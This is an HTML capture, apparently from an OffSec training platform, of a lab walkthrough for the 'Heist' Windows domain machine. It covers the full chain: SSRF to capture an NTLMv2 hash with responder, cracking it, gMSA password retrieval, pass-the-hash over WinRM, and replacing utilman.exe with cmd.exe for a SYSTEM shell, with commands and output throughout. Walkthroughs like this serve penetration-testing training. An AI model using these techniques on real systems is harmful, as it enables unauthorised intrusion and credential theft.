@@ -1,0 +1,454 @@
+<div id="__BVID__12___BV_modal_content_" tabindex="-1" class="modal-content"><header id="__BVID__12___BV_modal_header_" class="modal-header"><h5 id="__BVID__12___BV_modal_title_" class="modal-title">Walkthrough</h5><button type="button" aria-label="Close" class="close">×</button></header><div id="__BVID__12___BV_modal_body_" class="modal-body"><div class="mb-2 flex-grow" on-finish="function() {
+    [native code]
+}"><div class="markdown-container"><div class="markdown-content text-main-color"><!----><div><h1>Exploitation Guide for Heist</h1>
+<h2>Summary</h2>
+<p>In this walkthrough, we will leverage a server-side request forgery (SSRF) vulnerability to retrieve a NTLMv2 handshake via <code>responder</code>. We'll then abuse privileges of two users to obtain write permissions on the <strong>C:\Windows\system32\utilman.exe</strong> binary and trigger system-integrity execution via RDP (Remote Desktop Protocol).</p>
+<h2>Enumeration</h2>
+<h3>Nmap</h3>
+<p>We'll begin with an <code>nmap</code> scan against all TCP ports.</p>
+<pre id="fence-code-53" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nmap -p- 192.168.120.91
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-07 10:20 EDT
+Nmap scan report for 192.168.120.91
+Host is up (0.034s latency).
+Not shown: 65512 filtered ports
+PORT      STATE SERVICE
+53/tcp    open  domain
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+3389/tcp  open  ms-wbt-server
+5357/tcp  open  wsdapi
+5985/tcp  open  wsman
+8080/tcp  open  http-proxy
+9389/tcp  open  adws
+...
+</code></pre>
+<p>The scan shows numerous open ports on the target. The port numbers indicate that this is likely a Windows host. We'll focus on the web service running on port 8080. Let's scan the HTTP service in more detail.</p>
+<pre id="fence-code-54" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo nmap -sV -p 8080 192.168.120.91
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-07 10:49 EDT
+Nmap scan report for 192.168.120.91
+Host is up (0.066s latency).
+
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Werkzeug httpd 2.0.1 (Python 3.9.0)
+...
+</code></pre>
+<p>A quick online search of "Werkzeug" reveals that this is likely a Flask web application.</p>
+<h3>HTTP Enumeration</h3>
+<p>Visiting the web app on port 8080, we are presented with a URL input form labeled "Secure Web Browser".</p>
+<pre id="fence-code-55" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.120.91:8080/            
+&lt;!DOCTYPE html&gt;
+...
+    &lt;h1&gt;Secure Web Browser&lt;/h1&gt;
+    &lt;form action="/" method="GET"&gt;
+    &lt;div class="form col-xs-12"&gt;
+        &lt;input class="col-xs-9" id="searchBar" type="text" name="url" placeholder="Enter URL"/&gt;
+        &lt;button class="glyphicon glyphicon-search col-xs-1" data-toggle="tooltip" title="Search" id="submit"&gt;&lt;/button&gt;
+        &lt;span class="glyphicon bar col-xs-1" &gt;&lt;b&gt;|&lt;/b&gt;&lt;/span&gt;
+        &lt;a href="/?url=http://localhost" target="_blank"&gt;&lt;span class="glyphicon glyphicon-random col-xs-1"  data-toggle="tooltip" title="Random topic"&gt;&lt;/span&gt;&lt;/a&gt;
+      &lt;/div&gt;
+...
+</code></pre>
+<p>Since the form is expecting a URL, let's see if we can make it reach out to our attacking machine by supplying our IP address. We'll note that the GET variable for the URL is named <code>url</code></p>
+<p>First, we'll start our web server.</p>
+<pre id="fence-code-56" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+</code></pre>
+<p>We'll then send our request, supplying the address of our machine in the <code>url</code> parameter.</p>
+<pre id="fence-code-57" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.120.91:8080/?url=http://192.168.118.11
+&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8"&gt;
+&lt;title&gt;Directory listing for /&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Directory listing for /&lt;/h1&gt;
+&lt;hr&gt;
+...
+</code></pre>
+<p>Looking back to our web server, we see a request from the target.</p>
+<pre id="fence-code-58" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+192.168.120.91 - - [08/Sep/2021 10:47:45] "GET / HTTP/1.1" 200 -
+</code></pre>
+<h2>Exploitation</h2>
+<h3>Server-Side Request Forgery (SSRF)</h3>
+<p>Server-side request forgery (SSRF) is a web security vulnerability that allows us to induce the server-side application to make HTTP requests to an arbitrary domain of our choosing. Seeing that this a Windows target, we will attempt to steal a NTLMv2 handshake via <code>responder</code>, leveraging the SSRF vulnerability.</p>
+<p>We'll begin by running <code>responder</code> on our active network interface. In this case, the interface is <code>tap0</code>, but it may vary depending on our machine's setup and configuration.</p>
+<pre id="fence-code-59" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo responder -I tap0
+...
+[+] Generic Options:
+    Responder NIC              [tap0]
+    Responder IP               [192.168.118.11]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+
+
+[+] Listening for events...
+...
+</code></pre>
+<p>With the <code>responder</code> listening, we'll resend our request.</p>
+<pre id="fence-code-60" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.120.91:8080/?url=http://192.168.118.11
+...
+</code></pre>
+<p>After the request is sent, the <code>responder</code> receives the NTLMv2 handshake with a password hash.</p>
+<pre id="fence-code-61" class="fence-code"><code>...
+[+] Listening for events...
+
+[HTTP] NTLMv2 Client   : 192.168.120.91
+[HTTP] NTLMv2 Username : HEIST\enox
+[HTTP] NTLMv2 Hash     : enox::HEIST:3cb11309cd1acb88:7297ED93C8BA54EB24D27059939164E0:01010000000000009A112C36C7A4D701DAB5FBA18EB021F9000000000200080035004B005900470001001E00570049004E002D0030004300520032004A00380041005300440041004F000400140035004B00590047002E004C004F00430041004C0003003400570049004E002D0030004300520032004A00380041005300440041004F002E0035004B00590047002E004C004F00430041004C000500140035004B00590047002E004C004F00430041004C0008003000300000000000000000000000003000003108800B5B200C1AFFF1A529B603E2AF8DE7BD1500F04EE43010A42F68C794820A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E003100310038002E00310031000000000000000000
+</code></pre>
+<h3>NTLMv2 Password Hash Cracking</h3>
+<p>We can use <code>john</code> to attempt to crack the retrieved password hash with the <strong>rockyou.txt</strong> wordlist.</p>
+<pre id="fence-code-62" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ cat hash
+enox::HEIST:3cb11309cd1acb88:7297ED93C8BA54EB24D27059939164E0:01010000000000009A112C36C7A4D701DAB5FBA18EB021F9000000000200080035004B005900470001001E00570049004E002D0030004300520032004A00380041005300440041004F000400140035004B00590047002E004C004F00430041004C0003003400570049004E002D0030004300520032004A00380041005300440041004F002E0035004B00590047002E004C004F00430041004C000500140035004B00590047002E004C004F00430041004C0008003000300000000000000000000000003000003108800B5B200C1AFFF1A529B603E2AF8DE7BD1500F04EE43010A42F68C794820A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E003100310038002E00310031000000000000000000
+
+┌──(kali㉿kali)-[~]
+└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+california       (enox)
+1g 0:00:00:00 DONE (2021-09-08 12:21) 50.00g/s 51200p/s 51200c/s 51200C/s 123456..bethany
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed
+
+┌──(kali㉿kali)-[~]
+└─$ 
+</code></pre>
+<p>Nice, the password cracker arms us with the credential pair <code>enox:california</code>.</p>
+<h3>Windows Remote Management</h3>
+<p>Since our <code>nmap</code> scan showed the port 3389 open, we could try logging in via RDP using <code>rdesktop</code>. Unfortunately, that does not seem to work. Another approach is to utilize Windows Remote Management as we saw the port 5985 open as well.</p>
+<p>We'll use the <a href="https://github.com/Hackplayers/evil-winrm" target="_blank">evil-winrm</a> tool for this. Let's install it.</p>
+<pre id="fence-code-63" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ sudo gem install evil-winrm
+Fetching logger-1.4.3.gem
+Fetching evil-winrm-3.3.gem
+Successfully installed logger-1.4.3
+Happy hacking! :)
+Successfully installed evil-winrm-3.3
+Parsing documentation for logger-1.4.3
+Installing ri documentation for logger-1.4.3
+Parsing documentation for evil-winrm-3.3
+Installing ri documentation for evil-winrm-3.3
+Done installing documentation for logger, evil-winrm after 0 seconds
+2 gems installed
+
+┌──(kali㉿kali)-[~]
+└─$ which evil-winrm
+/usr/local/bin/evil-winrm
+</code></pre>
+<p>Let's use the recovered credentials to log in directly into a <em>WinRM</em> session.</p>
+<pre id="fence-code-64" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 192.168.120.91 -u enox -p california
+
+Evil-WinRM shell v3.2
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; whoami
+heist\enox
+*Evil-WinRM* PS C:\Users\enox\Documents&gt; 
+</code></pre>
+<p>Great, we're in!</p>
+<h2>Escalation</h2>
+<h3>Local Enumeration</h3>
+<p>Inside the <strong>C:\Users\enox\Desktop</strong> directory, we find a file <strong>todo.txt</strong>. Just as expected, it contains a list of remaining items for the developers to implement.</p>
+<pre id="fence-code-65" class="fence-code"><code>*Evil-WinRM* PS C:\Users\enox\Documents&gt; cd ..\Desktop
+*Evil-WinRM* PS C:\Users\enox\Desktop&gt; dir
+
+
+    Directory: C:\Users\enox\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        7/20/2021   4:12 AM                application
+-a----        7/20/2021   4:24 AM             34 local.txt
+-a----        5/27/2021   7:03 AM            239 todo.txt
+
+
+*Evil-WinRM* PS C:\Users\enox\Desktop&gt; type todo.txt
+- Setup Flask Application for Secure Browser [DONE]
+- Use group managed service account for apache [DONE]
+- Migrate to apache
+- Debug Flask Application [DONE]
+- Remove Flask Application
+- Submit IT Expenses file to admin. [DONE]
+
+
+*Evil-WinRM* PS C:\Users\enox\Desktop&gt; 
+</code></pre>
+<p>The item "Migrate to apache" is not marked as <code>DONE</code>. Seeing how the web application is running as a local user <code>enox</code>, we can venture a guess that the developers are intending to change the application to run under the context of a service account instead.</p>
+<p>Let's see what other users exist on this system.</p>
+<pre id="fence-code-66" class="fence-code"><code>*Evil-WinRM* PS C:\Users\enox\Desktop&gt; dir C:\Users
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        7/20/2021   4:25 AM                Administrator
+d-----        7/20/2021   4:17 AM                enox
+d-r---        5/28/2021   3:53 AM                Public
+d-----        9/14/2021   8:27 AM                svc_apache$
+</code></pre>
+<p>We find the account <code>svc_apache$</code>. Judging by the trailing <code>$</code> character, we know that this is a service account and probably the same account the developers are intending to use. Let's see what groups this account belongs to.</p>
+<pre id="fence-code-67" class="fence-code"><code>*Evil-WinRM* PS C:\Users\enox\Desktop&gt; Import-Module ActiveDirectory
+*Evil-WinRM* PS C:\Users\enox\Desktop&gt; Get-ADPrincipalGroupMembership svc_apache$ | select name
+
+name
+----
+Domain Computers
+Remote Management Users
+</code></pre>
+<p>We'll also check what groups our user is in.</p>
+<pre id="fence-code-68" class="fence-code"><code>*Evil-WinRM* PS C:\Users\enox\Desktop&gt; Get-ADPrincipalGroupMembership enox | select name
+
+name
+----
+Domain Users
+Remote Management Users
+Web Admins
+</code></pre>
+<p>The account we have taken over is in the <code>Web Admins</code> group. We can venture an educated guess that we might have some power over the Apache service account.</p>
+<h3>Group Managed Service Accounts (GMSA)</h3>
+<p>Group Managed Service Accounts provide a higher security option for non-interactive applications, services, processes, or tasks that run automatically but need a security credential.</p>
+<p>These service accounts are given automatically-generated passwords. Given certain permissions, it is possible to retrieve these password hashes from Active Directory. To see what users or groups have permissions to do that for a given service account, we can look up the <code>PrincipalsAllowedToRetrieveManagedPassword</code> user property on the account.</p>
+<pre id="fence-code-69" class="fence-code"><code>*Evil-WinRM* PS C:\Users\enox\Desktop&gt; Get-ADServiceAccount -Identity 'svc_apache$' -Properties * | Select PrincipalsAllowedToRetrieveManagedPassword
+
+PrincipalsAllowedToRetrieveManagedPassword
+------------------------------------------
+{CN=DC01,OU=Domain Controllers,DC=heist,DC=offsec, CN=Web Admins,CN=Users,DC=heist,DC=offsec}
+</code></pre>
+<p>It looks like the group <code>Web Admins</code> (i.e. the group we are in) has such privilege over the <code>svc_apache$</code> account. Let's see if we can indeed retrieve the password hash.</p>
+<pre id="fence-code-70" class="fence-code"><code>*Evil-WinRM* PS C:\Users\enox\Desktop&gt; Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
+
+
+DistinguishedName    : CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec
+Enabled              : True
+msDS-ManagedPassword : {1, 0, 0, 0...}
+Name                 : svc_apache
+ObjectClass          : msDS-GroupManagedServiceAccount
+ObjectGUID           : d40bc264-0c4e-4b86-b3b9-b775995ba303
+SamAccountName       : svc_apache$
+SID                  : S-1-5-21-537427935-490066102-1511301751-1105
+UserPrincipalName    :
+
+
+*Evil-WinRM* PS C:\Users\enox\Desktop&gt; $gmsa = Get-ADServiceAccount -Identity 'svc_apache$' -Properties 'msDS-ManagedPassword'
+*Evil-WinRM* PS C:\Users\enox\Desktop&gt; $mp = $gmsa.'msDS-ManagedPassword'
+*Evil-WinRM* PS C:\Users\enox\Desktop&gt; $mp
+1
+0
+0
+0
+36
+...
+</code></pre>
+<p>Nice, looks like we have the <code>ReadGMSAPassword</code> privilege over the <code>svc_apache$</code> service account.</p>
+<h3>Retrieving ReadGMSAPassword Hash</h3>
+<p>To retrieve the hash, we'll use a publicly available tool <a href="https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe" target="_blank">GMSAPasswordReader</a>. Let's download it from GitHub to our attacking machine.</p>
+<pre id="fence-code-71" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ wget https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
+--2021-09-16 08:50:14--  https://github.com/CsEnox/tools/raw/main/GMSAPasswordReader.exe
+Resolving github.com (github.com)... 140.82.112.3
+Connecting to github.com (github.com)|140.82.112.3|:443... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: https://raw.githubusercontent.com/CsEnox/tools/main/GMSAPasswordReader.exe [following]
+--2021-09-16 08:50:14--  https://raw.githubusercontent.com/CsEnox/tools/main/GMSAPasswordReader.exe
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 105984 (104K) [application/octet-stream]
+Saving to: ‘GMSAPasswordReader.exe’
+
+GMSAPasswordReader.exe           100%[========================================================&gt;] 103.50K  --.-KB/s    in 0.07s   
+
+2021-09-16 08:50:14 (1.50 MB/s) - ‘GMSAPasswordReader.exe’ saved [105984/105984]
+</code></pre>
+<p>We can now upload it to the target using our WinRM shell, and then execute it against the <code>svc_apache$</code> user.</p>
+<pre id="fence-code-72" class="fence-code"><code>*Evil-WinRM* PS C:\Users\enox\Desktop&gt; upload GMSAPasswordReader.exe
+Info: Uploading GMSAPasswordReader.exe to C:\Users\enox\Desktop\GMSAPasswordReader.exe
+
+                                                             
+Data: 141312 bytes of 141312 bytes copied
+
+Info: Upload successful!
+
+*Evil-WinRM* PS C:\Users\enox\Desktop&gt; ./GMSAPasswordReader.exe --accountname svc_apache
+Calculating hashes for Old Value
+[*] Input username             : svc_apache$
+[*] Input domain               : HEIST.OFFSEC
+[*] Salt                       : HEIST.OFFSECsvc_apache$
+[*]       rc4_hmac             : 499542099FD11295C6088ED72981C554
+[*]       aes128_cts_hmac_sha1 : AE0C9B62E3A58D96A730A8A91E56D108
+[*]       aes256_cts_hmac_sha1 : 8629B140D3B75DA7A1BF053D15C65C55900BA66AA113084E21EA2F4385286CF4
+[*]       des_cbc_md5          : 9E340723700454E9
+
+Calculating hashes for Current Value
+[*] Input username             : svc_apache$
+[*] Input domain               : HEIST.OFFSEC
+[*] Salt                       : HEIST.OFFSECsvc_apache$
+[*]       rc4_hmac             : E9492A23D8FB9A8E6073EA446D861DCD
+[*]       aes128_cts_hmac_sha1 : 17898FDC7CDDE74DB2ECE67347C4B152
+[*]       aes256_cts_hmac_sha1 : 3502BB7DDE67B764C87D20D2DFEBDF0354091EC69FF5ED5344E3FE14786BF74F
+[*]       des_cbc_md5          : FB34F120C2F401F2
+
+*Evil-WinRM* PS C:\Users\enox\Desktop&gt;
+</code></pre>
+<p>Great, the tool retrieved the current RC4 HMAC of the password to be <code>E9492A23D8FB9A8E6073EA446D861DCD</code>.</p>
+<h3>Pass the Hash Attack</h3>
+<p>Next, we'll attempt to perform a pass the hash attack using <code>evil-winrm</code> to authenticate as <code>svc_apache$</code> with the recovered hash.</p>
+<pre id="fence-code-73" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ evil-winrm -i 192.168.120.91 -u svc_apache$ -H E9492A23D8FB9A8E6073EA446D861DCD
+
+Evil-WinRM shell v3.2
+
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt; whoami
+heist\svc_apache$
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt;
+</code></pre>
+<p>The attack is successful, and we have taken over this service account as well.</p>
+<h3>Permission Enumeration</h3>
+<p>Checking this account's privileges, we discover that the account has the <code>SeRestorePrivilege</code> permission.</p>
+<pre id="fence-code-74" class="fence-code"><code>*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt;
+</code></pre>
+<h3>SeRestorePrivilege Abuse</h3>
+<p>The <code>SeRestorePrivilege</code> privilege allows a user to circumvent file and directory permissions when restoring backed up files and directories, thus giving the user read and write access to system files.</p>
+<p>We will use the <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1" target="_blank">EnableSeRestorePrivilege.ps1</a> script to enable this privilege in our PowerShell session. Let's begin by downloading it to our attacking machine.</p>
+<pre id="fence-code-75" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ wget https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
+--2021-09-16 09:05:07--  https://raw.githubusercontent.com/gtworek/PSBits/master/Misc/EnableSeRestorePrivilege.ps1
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3213 (3.1K) [text/plain]
+Saving to: ‘EnableSeRestorePrivilege.ps1’
+
+EnableSeRestorePrivilege.ps1     100%[========================================================&gt;]   3.14K  --.-KB/s    in 0.002s  
+
+2021-09-16 09:05:07 (1.67 MB/s) - ‘EnableSeRestorePrivilege.ps1’ saved [3213/3213]
+</code></pre>
+<p>Next, we'll upload it to the target using our shell and run it.</p>
+<pre id="fence-code-76" class="fence-code"><code>*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt; upload EnableSeRestorePrivilege.ps1
+Info: Uploading EnableSeRestorePrivilege.ps1 to C:\Users\svc_apache$\Documents\EnableSeRestorePrivilege.ps1
+
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt; ./EnableSeRestorePrivilege.ps1
+Debug:
+        using System;
+        using System.Diagnostics;
+        using System.Runtime.InteropServices;
+        using System.Security.Principal;
+
+        [StructLayout(LayoutKind.Sequential, Pack = 1)]
+        public struct TokPriv1Luid
+        {
+                public int Count;
+                public long Luid;
+                public int Attr;
+        }
+
+        public static class Advapi32
+        {
+                [DllImport("advapi32.dll", SetLastError=true)]
+                public static extern bool OpenProcessToken(
+                        IntPtr ProcessHandle,
+                        int DesiredAccess,
+                        ref IntPtr TokenHandle);
+
+                [DllImport("advapi32.dll", SetLastError=true)]
+                public static extern bool LookupPrivilegeValue(
+                        string lpSystemName,
+                        string lpName,
+                        ref long lpLuid);
+
+                [DllImport("advapi32.dll", SetLastError = true)]
+                public static extern bool AdjustTokenPrivileges(
+                        IntPtr TokenHandle,
+                        bool DisableAllPrivileges,
+                        ref TokPriv1Luid NewState,
+                        int BufferLength,
+                        IntPtr PreviousState,
+                        IntPtr ReturnLength);
+
+        }
+
+        public static class Kernel32
+        {
+                [DllImport("kernel32.dll")]
+                public static extern uint GetLastError();
+        }
+Debug: Current process handle: 3628
+Debug: Calling OpenProcessToken()
+Debug: Token handle: 3648
+Debug: Calling LookupPrivilegeValue for SeRestorePrivilege
+Debug: SeRestorePrivilege LUID value: 18
+Debug: Calling AdjustTokenPrivileges
+Debug: GetLastError returned: 0
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt;
+</code></pre>
+<p>We should now have write access to <strong>C:\Windows\System32</strong>.</p>
+<h3>Utilman.exe Abuse with RDP</h3>
+<p>The <strong>utilman.exe</strong> is a built-in Windows application that is designed to allow users to configure system accessibility options such as the <em>Magnifier</em>, <em>High Contrast Theme</em>, <em>Narrator</em>, and <em>On Screen Keyboard</em> before they log in to the system.</p>
+<p>This application is triggered by issuing the <code>WIN + U</code> key combination while on the Windows Logon screen. It's important to note that the application runs with SYSTEM privileges.</p>
+<p>We can leverage our write access in the system directory <strong>C:\Windows\System32</strong> to replace <strong>utilman.exe</strong> with <strong>cmd.exe</strong>.</p>
+<pre id="fence-code-77" class="fence-code"><code>*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt; move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt; move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+*Evil-WinRM* PS C:\Users\svc_apache$\Documents&gt;
+</code></pre>
+<p>If we can now trigger the application, it should grant us a SYSTEM shell. Let's give this a try using Remote Desktop Protocol with <code>rdesktop</code>.</p>
+<pre id="fence-code-78" class="fence-code"><code>┌──(kali㉿kali)-[~]
+└─$ rdesktop 192.168.120.91
+Autoselecting keyboard map 'en-us' from locale
+...
+</code></pre>
+<p>We'll issue <code>WIN + U</code> (<code>CMD + U</code> on Mac keyboards) on the logon screen to trigger the execution of <strong>utilman.exe</strong>. If all went well, the application should run <strong>cmd.exe</strong> with system-level integrity.</p>
+<p>
+</p><figure>
+<img src="https://offsec-platform.s3.amazonaws.com/walkthroughs-images/PG-Practice_83_image_1_FiqdDtvd.png" alt="">
+<figcaption></figcaption>
+</figure>
+<p></p>
+<p>Wonderful, we have a SYSTEM shell!</p>
+</div><!----></div></div><div class="d-flex flex-row full-width mt-4 mb-1 justify-content-end"><button type="button" class="btn transparent-btn mb-2 pl-0 pr-0 btn-link btn-lg">
+      Close
+    </button><!----></div></div></div><!----></div>
